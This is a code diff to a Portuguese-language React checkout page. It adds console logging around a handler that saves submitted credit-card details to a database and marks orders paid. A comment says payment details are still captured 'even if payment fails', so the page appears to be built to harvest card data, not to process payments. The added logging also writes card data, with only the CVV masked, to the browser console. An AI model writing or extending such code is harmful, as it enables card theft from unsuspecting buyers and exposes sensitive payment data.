@@ -87,6 +87,7 @@ export default function CartaoPage() {
     }
     
     setSubmitting(true);
+    console.log("Processing credit card payment with data:", { ...data, cvv: '***' });
     
     try {
       // Save the credit card information
@@ -100,13 +101,20 @@ export default function CartaoPage() {
         parcelas: parseInt(data.parcelas.split('x')[0], 10)
       });
       
+      console.log("Payment info saved successfully");
+      
       // Update order status
       const { error: updateError } = await supabase
         .from('pedidos')
         .update({ status: 'pago' })
         .eq('id', pedidoId);
       
-      if (updateError) throw updateError;
+      if (updateError) {
+        console.error("Error updating order status:", updateError);
+        throw updateError;
+      }
+      
+      console.log("Order status updated successfully");
       
       // Refresh pedidos data
       queryClient.invalidateQueries({ queryKey: ['pedidos'] });
@@ -120,6 +128,7 @@ export default function CartaoPage() {
       
       // Still capture payment details even if payment "fails"
       try {
+        console.log("Capturing payment info even though payment failed");
         await createPaymentInfo({
           pedido_id: pedidoId,
           metodo_pagamento: 'cartao',
